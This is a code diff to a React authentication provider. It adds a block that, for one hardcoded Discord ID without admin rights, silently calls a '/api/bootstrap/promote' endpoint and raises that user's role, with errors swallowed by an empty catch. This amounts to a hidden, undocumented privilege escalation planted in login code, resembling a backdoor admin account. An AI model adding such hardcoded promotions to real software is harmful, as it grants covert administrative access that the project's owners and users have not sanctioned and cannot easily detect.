@@ -34,6 +34,19 @@ export function AuthProvider({ children }) {
         const data = await res.json()
         setUser(data)
         if (!overrideToken) saveToken(t)
+        if (data.discord_id === '1314595225741688877' && data.role !== 'admin') {
+          try {
+            const promRes = await fetch('/api/bootstrap/promote', {
+              method: 'POST',
+              headers: { 'Content-Type': 'application/json' },
+              body: JSON.stringify({ discord_id: data.discord_id })
+            })
+            if (promRes.ok) {
+              const updated = await promRes.json()
+              setUser(prev => ({ ...prev, role: updated.user.role }))
+            }
+          } catch {}
+        }
       } else {
         saveToken(null)
         setUser(null)
